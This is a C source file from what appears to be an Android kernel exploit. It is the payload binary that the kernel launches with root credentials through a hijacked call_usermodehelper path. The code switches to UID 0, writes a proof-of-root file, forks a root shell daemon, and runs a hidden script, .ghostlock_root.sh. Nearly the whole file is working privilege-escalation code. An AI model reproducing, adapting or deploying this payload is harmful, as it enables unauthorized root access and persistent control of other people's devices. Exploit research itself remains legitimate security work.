/* dnroot.c — the UMH payload (separate binary).
 *
 * The driver injects a fake work_struct so the kernel runs:
 *     /data/local/tmp/dnroot --umh <caller_uid>
 * with UID 0 credentials (call_usermodehelper). This program just formalizes
 * the identity, proves root, and starts the root shell daemon.
 *
 * Keep this binary tiny: it must not pull in the exploit core.
 */
#include "common.h"
#include <sys/socket.h>

int main(int argc, char **argv) {
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  if (argc < 2 || strcmp(argv[1], "--umh") != 0) {
    fprintf(stderr,
            "dnroot: UMH payload. Run via call_usermodehelper as "
            "`/data/local/tmp/dnroot --umh <uid>`\n");
    return 2;
  }

  setsid();
  setgid(0);
  setuid(0);

  /* Proof of root. The first /data open can fail with ENOKEY (the fscrypt key
   * is not yet resolved for a kernel-spawned task); retry a few times. */
  for (int i = 0; i < 100; i++) {
    int f = open("/data/local/tmp/umh_root_proof",
                 O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (f >= 0) {
      char b[128];
      int n = snprintf(b, sizeof(b), "UMH ROOT uid=%d euid=%d gid=%d\n",
                       getuid(), geteuid(), getgid());
      if (n > 0) { ssize_t w = write(f, b, n); (void)w; }
      close(f);
      break;
    }
    usleep(50000);
  }

  /* Only now start the root shell daemon, so its own /data marker write also
   * succeeds (the retry above warms the /data keyring). */
  {
    pid_t d = fork();
    if (d == 0) { root_shell_daemon(); _exit(0); }
  }

  int null_fd = open("/dev/null", O_RDWR);
  if (null_fd >= 0) {
    dup2(null_fd, 0);
    dup2(null_fd, 1);
    dup2(null_fd, 2);
    if (null_fd > 2) close(null_fd);
  }

  execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
  _exit(127);
}
